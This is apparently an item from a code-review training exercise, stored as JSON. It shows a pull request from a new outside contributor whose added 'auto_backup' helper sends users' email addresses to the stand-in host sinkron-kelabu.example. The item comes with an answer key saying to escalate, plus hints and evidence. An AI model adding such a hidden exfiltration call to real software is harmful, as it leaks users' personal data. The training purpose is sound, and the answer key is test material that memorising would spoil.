@@ -1,0 +1,100 @@
+{
+  "id": "s05-pr-006",
+  "type": "pull-request",
+  "conceptIds": ["secure-coding", "code-review"],
+  "difficulty": 3,
+  "verdict": "specialist",
+  "correctDecision": "escalate",
+  "acceptableDecisions": {},
+  "severity": 3,
+  "data": {
+    "author": {
+      "name": "helper-kode",
+      "team": "Outside contributor"
+    },
+    "title": "Add an automatic backup of user data",
+    "description": [
+      {
+        "text": "Hi! I made a small helper so user data gets an automatic backup.",
+        "evidenceId": "desc-pitch"
+      },
+      {
+        "text": "The change is small and all tests pass, so please just approve it right away.",
+        "evidenceId": "desc-rush"
+      }
+    ],
+    "file": "accounts/users.py",
+    "diff": [
+      {
+        "code": "def save_user(user):",
+        "indent": 0,
+        "kind": "ctx",
+        "evidenceId": "line-def"
+      },
+      {
+        "code": "database.save(user)",
+        "indent": 1,
+        "kind": "ctx",
+        "evidenceId": "line-db"
+      },
+      {
+        "code": "auto_backup(user)",
+        "indent": 1,
+        "kind": "add",
+        "evidenceId": "line-call"
+      },
+      {
+        "code": "def auto_backup(user):",
+        "indent": 0,
+        "kind": "add",
+        "evidenceId": "line-helper"
+      },
+      {
+        "code": "data = {\"email\": user[\"email\"]}",
+        "indent": 1,
+        "kind": "add",
+        "evidenceId": "line-email"
+      },
+      {
+        "code": "send(\"https://sinkron-kelabu.example/terima\", data)",
+        "indent": 1,
+        "kind": "add",
+        "evidenceId": "line-send"
+      }
+    ],
+    "checks": [
+      {
+        "text": "Automated tests: 12/12 passed",
+        "evidenceId": "check-tests"
+      },
+      {
+        "text": "Author account: created 2 days ago, no previous contributions",
+        "evidenceId": "check-account"
+      }
+    ]
+  },
+  "evidence": {
+    "required": ["line-send", "check-account"],
+    "supporting": ["line-email", "desc-rush", "lint-domain", "line-call"]
+  },
+  "explanation": "A new outside account adds code that quietly sends users' emails to the unknown address sinkron-kelabu.example. This is not an ordinary bug: do not approve or revise it yourself, escalate it to the SOC team.",
+  "ruleRefs": ["r-sec-3", "r-rev-4"],
+  "hints": [
+    "The tests pass, but where does the user data go? Also check who wrote it.",
+    "Unknown account + user data sent to an address outside the company. Who is authorised to look into this?"
+  ],
+  "intel": {
+    "lint": [
+      {
+        "text": "Line 6: the address sinkron-kelabu.example is not on the company's list of official servers",
+        "evidenceId": "lint-domain"
+      }
+    ],
+    "tests": [
+      {
+        "text": "Tests only check that save_user stores the data; there is no test for auto_backup",
+        "evidenceId": "test-none"
+      }
+    ]
+  }
+}
